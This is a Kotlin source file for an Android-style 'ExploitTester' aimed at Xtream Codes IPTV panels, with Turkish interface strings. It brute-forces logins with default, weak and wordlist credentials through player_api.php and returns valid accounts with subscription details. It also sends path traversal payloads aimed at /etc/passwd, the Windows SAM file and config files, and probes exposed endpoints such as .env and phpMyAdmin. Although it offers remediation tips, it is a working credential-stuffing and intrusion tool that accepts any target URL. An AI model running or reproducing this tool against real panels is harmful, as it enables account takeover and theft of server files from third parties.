package com.alibaba.data.service

import com.alibaba.domain.model.*
import com.alibaba.domain.service.ExploitTester
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ExploitTesterImpl @Inject constructor() : ExploitTester {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .build()

    override suspend fun runExploitTest(
        config: ExploitTestConfig,
        onProgress: (ExploitTestProgress) -> Unit,
        onVulnerabilityFound: (ExploitTestResult) -> Unit
    ): List<ExploitTestResult> = withContext(Dispatchers.IO) {
        
        val results = mutableListOf<ExploitTestResult>()
        var foundVulnerabilities = 0
        var foundCredentials = 0
        
        val baseUrl = buildBaseUrl(config.panelUrl, config.panelPort)
        
        // Check if panel is reachable
        onProgress(ExploitTestProgress(
            currentTest = "Panel erişilebilirlik kontrolü",
            currentPhase = TestPhase.INITIALIZING,
            progress = 0,
            total = 100,
            foundVulnerabilities = 0,
            foundCredentials = 0
        ))
        
        if (!checkPanelReachable(config.panelUrl, config.panelPort)) {
            val result = ExploitTestResult(
                vulnerability = VulnerabilityType.INFORMATION_DISCLOSURE,
                severity = Severity.INFO,
                description = "Panel erişilemedi: $baseUrl",
                exploitMethod = "Panel URL'si veya port yanlış olabilir",
                recommendation = "Panel URL ve port bilgilerini kontrol edin"
            )
            results.add(result)
            onVulnerabilityFound(result)
            return@withContext results
        }
        
        // Calculate total tests
        var totalTests = 0
        if (config.testDefaultCredentials) totalTests += DefaultCredentials.credentials.size
        if (config.testUserEnumeration) totalTests += CommonUsernames.usernames.size * 5
        if (config.testPathTraversal) totalTests += 10
        if (config.testApiEndpoints) totalTests += 15
        if (config.testBruteForceProtection) totalTests += 20
        if (config.customWordlist.isNotEmpty()) totalTests += config.customWordlist.size
        
        var currentTest = 0
        
        // 1. Test Default Credentials
        if (config.testDefaultCredentials) {
            onProgress(ExploitTestProgress(
                currentTest = "Varsayılan kimlik bilgileri test ediliyor",
                currentPhase = TestPhase.TESTING_DEFAULT_CREDS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            for ((username, password) in DefaultCredentials.credentials) {
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Test: $username:$password",
                    currentPhase = TestPhase.TESTING_DEFAULT_CREDS,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val credential = testCredential(config.panelUrl, config.panelPort, username, password)
                if (credential != null) {
                    foundCredentials++
                    foundVulnerabilities++
                    
                    val result = ExploitTestResult(
                        vulnerability = VulnerabilityType.DEFAULT_CREDENTIALS,
                        severity = Severity.CRITICAL,
                        description = "Varsayılan kimlik bilgileri ile giriş yapıldı!",
                        exploitMethod = "Xtream Codes API player_api.php endpoint'ine $username:$password ile istek atıldı ve başarılı yanıt alındı.",
                        foundCredentials = credential,
                        recommendation = "Bu hesabın şifresini hemen değiştirin! Varsayılan kullanıcı adlarını (admin, test, demo) kullanmayın. Güçlü şifreler kullanın (en az 12 karakter, büyük/küçük harf, rakam, özel karakter)."
                    )
                    results.add(result)
                    onVulnerabilityFound(result)
                }
                
                delay(100) // Rate limiting
            }
        }
        
        // 2. Test Common Usernames with Weak Passwords
        if (config.testUserEnumeration) {
            onProgress(ExploitTestProgress(
                currentTest = "Yaygın kullanıcı adları test ediliyor",
                currentPhase = TestPhase.TESTING_COMMON_USERS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            val weakPasswords = listOf("123456", "password", "12345678", "1234", "")
            
            for (username in CommonUsernames.usernames) {
                for (password in weakPasswords) {
                    currentTest++
                    
                    onProgress(ExploitTestProgress(
                        currentTest = "Test: $username:${if (password.isEmpty()) "(boş)" else password}",
                        currentPhase = TestPhase.TESTING_COMMON_USERS,
                        progress = currentTest,
                        total = totalTests,
                        foundVulnerabilities = foundVulnerabilities,
                        foundCredentials = foundCredentials
                    ))
                    
                    val credential = testCredential(config.panelUrl, config.panelPort, username, password)
                    if (credential != null) {
                        foundCredentials++
                        foundVulnerabilities++
                        
                        val vulnType = if (password.isEmpty()) {
                            VulnerabilityType.WEAK_PASSWORD
                        } else if (password.length < 6) {
                            VulnerabilityType.WEAK_PASSWORD
                        } else {
                            VulnerabilityType.WEAK_PASSWORD
                        }
                        
                        val result = ExploitTestResult(
                            vulnerability = vulnType,
                            severity = if (password.isEmpty()) Severity.CRITICAL else Severity.HIGH,
                            description = "Zayıf şifre ile giriş yapıldı: $username",
                            exploitMethod = "Kullanıcı adı '$username' ve zayıf şifre '${if (password.isEmpty()) "(boş)" else password}' ile player_api.php'ye istek atıldı.",
                            foundCredentials = credential,
                            recommendation = "Bu hesabın şifresini güçlü bir şifre ile değiştirin. Boş şifre veya yaygın şifreler (123456, password) kullanmayın."
                        )
                        results.add(result)
                        onVulnerabilityFound(result)
                    }
                    
                    delay(100)
                }
            }
        }
        
        // 3. Test Path Traversal
        if (config.testPathTraversal) {
            onProgress(ExploitTestProgress(
                currentTest = "Dizin gezinme açıkları test ediliyor",
                currentPhase = TestPhase.TESTING_PATH_TRAVERSAL,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            val pathTraversalPayloads = listOf(
                "../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//....//etc/passwd",
                "/etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "../../../var/www/html/config.php",
                "..%252f..%252f..%252fetc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//var/www/xtream-codes/config",
                "../../../home/xtream/config"
            )
            
            for (payload in pathTraversalPayloads) {
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Path Traversal: ${payload.take(30)}...",
                    currentPhase = TestPhase.TESTING_PATH_TRAVERSAL,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val vulnerable = testPathTraversal(baseUrl, payload)
                if (vulnerable) {
                    foundVulnerabilities++
                    
                    val result = ExploitTestResult(
                        vulnerability = VulnerabilityType.PATH_TRAVERSAL,
                        severity = Severity.CRITICAL,
                        description = "Dizin gezinme açığı bulundu!",
                        exploitMethod = "Payload '$payload' ile sunucu dosya sistemine erişim sağlandı.",
                        recommendation = "Web sunucusu yapılandırmasını kontrol edin. Path traversal filtreleri ekleyin. Xtream Codes'u güncelleyin."
                    )
                    results.add(result)
                    onVulnerabilityFound(result)
                }
                
                delay(100)
            }
        }
        
        // 4. Test API Endpoints
        if (config.testApiEndpoints) {
            onProgress(ExploitTestProgress(
                currentTest = "API endpoint'ler kontrol ediliyor",
                currentPhase = TestPhase.TESTING_API_ENDPOINTS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            val sensitiveEndpoints = listOf(
                "/panel_api.php" to "Panel API (yetkisiz erişim)",
                "/api.php" to "Genel API",
                "/xmltv.php" to "XMLTV (EPG verisi)",
                "/stalker_portal/" to "Stalker Portal",
                "/c/" to "Stalker Portal Kısa Yol",
                "/get.php" to "M3U Playlist (kimlik bilgisi gerekli)",
                "/player_api.php" to "Player API",
                "/live/" to "Canlı Yayın Dizini",
                "/movie/" to "Film Dizini",
                "/series/" to "Dizi Dizini",
                "/admin/" to "Admin Paneli",
                "/phpmyadmin/" to "phpMyAdmin",
                "/.env" to "Environment Dosyası",
                "/config.php" to "Yapılandırma Dosyası",
                "/debug.log" to "Debug Log"
            )
            
            for ((endpoint, description) in sensitiveEndpoints) {
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Endpoint: $endpoint",
                    currentPhase = TestPhase.TESTING_API_ENDPOINTS,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val (accessible, statusCode, hasContent) = testEndpoint(baseUrl, endpoint)
                if (accessible && hasContent) {
                    foundVulnerabilities++
                    
                    val severity = when {
                        endpoint.contains("admin") || endpoint.contains("config") || endpoint.contains(".env") -> Severity.CRITICAL
                        endpoint.contains("phpmyadmin") || endpoint.contains("debug") -> Severity.HIGH
                        endpoint.contains("panel_api") -> Severity.HIGH
                        else -> Severity.MEDIUM
                    }
                    
                    val result = ExploitTestResult(
                        vulnerability = VulnerabilityType.API_EXPOSURE,
                        severity = severity,
                        description = "$description endpoint'i erişilebilir durumda (HTTP $statusCode)",
                        exploitMethod = "$baseUrl$endpoint adresine GET isteği atıldı ve içerik döndü.",
                        recommendation = "Bu endpoint'i güvenlik duvarı veya .htaccess ile koruyun. Gereksiz endpoint'leri devre dışı bırakın."
                    )
                    results.add(result)
                    onVulnerabilityFound(result)
                }
                
                delay(100)
            }
        }
        
        // 5. Test Brute Force Protection
        if (config.testBruteForceProtection) {
            onProgress(ExploitTestProgress(
                currentTest = "Brute-force koruması test ediliyor",
                currentPhase = TestPhase.TESTING_RATE_LIMIT,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            var successfulRequests = 0
            val testCount = 20
            
            for (i in 1..testCount) {
                currentTest++
                
                onProgress(ExploitTestProgress(
                    currentTest = "Rate limit test: $i/$testCount",
                    currentPhase = TestPhase.TESTING_RATE_LIMIT,
                    progress = currentTest,
                    total = totalTests,
                    foundVulnerabilities = foundVulnerabilities,
                    foundCredentials = foundCredentials
                ))
                
                val response = makeApiRequest(baseUrl, "bruteforce_test_$i", "wrong_password_$i")
                if (response != null) {
                    successfulRequests++
                }
                
                delay(50) // Fast requests to test rate limiting
            }
            
            if (successfulRequests >= 18) { // If most requests went through
                foundVulnerabilities++
                
                val result = ExploitTestResult(
                    vulnerability = VulnerabilityType.NO_RATE_LIMIT,
                    severity = Severity.HIGH,
                    description = "Brute-force koruması yok veya yetersiz!",
                    exploitMethod = "20 ardışık istek atıldı ve $successfulRequests tanesi başarıyla işlendi. Rate limiting aktif değil.",
                    recommendation = "Fail2ban veya benzeri bir araç ile brute-force koruması ekleyin. IP başına istek limiti koyun. CAPTCHA ekleyin."
                )
                results.add(result)
                onVulnerabilityFound(result)
            }
        }
        
        // 6. Test Custom Wordlist
        if (config.customWordlist.isNotEmpty()) {
            onProgress(ExploitTestProgress(
                currentTest = "Özel kelime listesi test ediliyor",
                currentPhase = TestPhase.TESTING_WEAK_PASSWORDS,
                progress = currentTest,
                total = totalTests,
                foundVulnerabilities = foundVulnerabilities,
                foundCredentials = foundCredentials
            ))
            
            for (combo in config.customWordlist) {
                currentTest++
                
                val parts = combo.split(":", limit = 2)
                if (parts.size == 2) {
                    val username = parts[0]
                    val password = parts[1]
                    
                    onProgress(ExploitTestProgress(
                        currentTest = "Özel test: $username:***",
                        currentPhase = TestPhase.TESTING_WEAK_PASSWORDS,
                        progress = currentTest,
                        total = totalTests,
                        foundVulnerabilities = foundVulnerabilities,
                        foundCredentials = foundCredentials
                    ))
                    
                    val credential = testCredential(config.panelUrl, config.panelPort, username, password)
                    if (credential != null) {
                        foundCredentials++
                        foundVulnerabilities++
                        
                        val result = ExploitTestResult(
                            vulnerability = VulnerabilityType.WEAK_PASSWORD,
                            severity = Severity.HIGH,
                            description = "Özel kelime listesinden hesap bulundu: $username",
                            exploitMethod = "Özel kelime listesindeki '$username:$password' kombinasyonu ile giriş yapıldı.",
                            foundCredentials = credential,
                            recommendation = "Bu hesabın şifresini değiştirin ve güçlü şifre politikası uygulayın."
                        )
                        results.add(result)
                        onVulnerabilityFound(result)
                    }
                }
                
                delay(100)
            }
        }
        
        // Final progress
        onProgress(ExploitTestProgress(
            currentTest = "Test tamamlandı",
            currentPhase = TestPhase.COMPLETED,
            progress = totalTests,
            total = totalTests,
            foundVulnerabilities = foundVulnerabilities,
            foundCredentials = foundCredentials
        ))
        
        results
    }

    override suspend fun testCredential(
        panelUrl: String,
        port: Int,
        username: String,
        password: String
    ): FoundCredential? = withContext(Dispatchers.IO) {
        val baseUrl = buildBaseUrl(panelUrl, port)
        val response = makeApiRequest(baseUrl, username, password)
        
        if (response != null) {
            try {
                val json = JSONObject(response)
                val userInfo = json.optJSONObject("user_info")
                
                if (userInfo != null && userInfo.optString("auth", "0") == "1") {
                    val info = UserInfo(
                        username = userInfo.optString("username", username),
                        password = userInfo.optString("password", password),
                        status = userInfo.optString("status", "Unknown"),
                        expDate = userInfo.optString("exp_date", null),
                        activeCons = userInfo.optInt("active_cons", 0),
                        maxConnections = userInfo.optInt("max_connections", 1),
                        isTrial = userInfo.optInt("is_trial", 0) == 1,
                        createdAt = userInfo.optString("created_at", null)
                    )
                    
                    return@withContext FoundCredential(
                        username = username,
                        password = password,
                        panelUrl = baseUrl,
                        userInfo = info
                    )
                }
            } catch (e: Exception) {
                // JSON parse error, not a valid response
            }
        }
        
        null
    }

    override suspend fun checkPanelReachable(panelUrl: String, port: Int): Boolean = withContext(Dispatchers.IO) {
        try {
            val baseUrl = buildBaseUrl(panelUrl, port)
            val request = Request.Builder()
                .url("$baseUrl/player_api.php")
                .head()
                .build()
            
            val response = client.newCall(request).execute()
            response.close()
            true
        } catch (e: Exception) {
            false
        }
    }
    
    private fun buildBaseUrl(panelUrl: String, port: Int): String {
        var url = panelUrl.trim()
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            url = "http://$url"
        }
        url = url.trimEnd('/')
        
        // Add port if not already in URL
        if (!url.contains(":$port") && !url.contains(":80") && !url.contains(":443")) {
            val protocolEnd = url.indexOf("://") + 3
            val pathStart = url.indexOf("/", protocolEnd).takeIf { it > 0 } ?: url.length
            val hostPart = url.substring(0, pathStart)
            val pathPart = url.substring(pathStart)
            url = "$hostPart:$port$pathPart"
        }
        
        return url
    }
    
    private fun makeApiRequest(baseUrl: String, username: String, password: String): String? {
        return try {
            val url = "$baseUrl/player_api.php?username=$username&password=$password"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string()
            response.close()
            body
        } catch (e: Exception) {
            null
        }
    }
    
    private fun testPathTraversal(baseUrl: String, payload: String): Boolean {
        return try {
            val url = "$baseUrl/$payload"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()
            
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: ""
            response.close()
            
            // Check for common indicators of successful path traversal
            body.contains("root:") || 
            body.contains("[boot loader]") ||
            body.contains("<?php") ||
            body.contains("DB_HOST") ||
            body.contains("mysql_")
        } catch (e: Exception) {
            false
        }
    }
    
    private fun testEndpoint(baseUrl: String, endpoint: String): Triple<Boolean, Int, Boolean> {
        return try {
            val url = "$baseUrl$endpoint"
            val request = Request.Builder()
                .url(url)
                .get()
                .build()
            
            val response = client.newCall(request).execute()
            val statusCode = response.code
            val body = response.body?.string() ?: ""
            response.close()
            
            val accessible = statusCode in 200..399
            val hasContent = body.length > 50 && !body.contains("404") && !body.contains("Not Found")
            
            Triple(accessible, statusCode, hasContent)
        } catch (e: Exception) {
            Triple(false, 0, false)
        }
    }
}
